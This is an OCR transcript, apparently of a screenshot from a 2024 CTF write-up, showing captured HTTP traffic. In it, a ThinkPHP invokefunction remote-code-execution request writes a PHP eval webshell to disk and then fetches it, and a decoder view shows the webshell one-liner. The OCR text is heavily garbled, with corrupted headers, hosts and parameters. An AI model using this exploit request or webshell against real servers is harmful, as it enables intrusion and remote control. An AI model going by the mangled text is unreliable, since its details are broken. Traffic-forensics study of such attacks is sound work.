@@ -1,0 +1,40 @@
+# OCR: 4aba03a2860adaaf3c871605e47f0bd2.jpg
+# 来源: .\02-WriteUp\2024\4aba03a2860adaaf3c871605e47f0bd2.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:28
+
+| Ml Wireshark» 188% HTTF
+:
+{tep.stream eq 107) tepdump t.cap
+‘GET /2s=/admin/\think\app/invokefunction8function=call_user_func_array&wvars[0]=flle put_contents8ivarsi1]l)=peiql php8&vars{tII= <?php%20@eval$ POSTI%27pelqi%27?> HTTP/1.1
+User-Agent: Java/11.0.13
+Host: 222.22.180
+‘Accept: text/html, image/aif, image/jpeg, *: q=.2, qn
+‘Connection: keep-alive
+HITP/1.1 200 OK
+Server: nginx
+Date: Fr, 04 Mar 2022 07:15:13 GMT
+‘Content-Type: text/html: charset=utf-8
+‘ransfer-Encoding: chunked
+Connection: keep-alive
+Vary: Accept-Encoding
+30GET /peighphp HTTP/1.1
+‘User-Agent: Java/11.0.13
+Host 22222180
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */* q=.2
+Connection: keep-alive
+HITP/1.1 200 OK
+Server: nginx
+Date: Fri, 04 Mar 2022 07:15:13 GMT.
+Content-Type: text/ntmi; charset=UTF-8
+Tiansfer-Encoding: chunked
+Connection: keep-alive
+Vary: Accept-Encoding
+Dcial un x |
+Qctoo 1412 8H MESS He 8 E
+Base64 @ URLS Uncode WTNB “HerSmg HniWB ,GZP
+8 8
+<Pphp%2o@eval$_POSTI%27petqi%27))?>
+<?php @eval$_POSTIpeiqi})?>
+BWR RAR
+eon
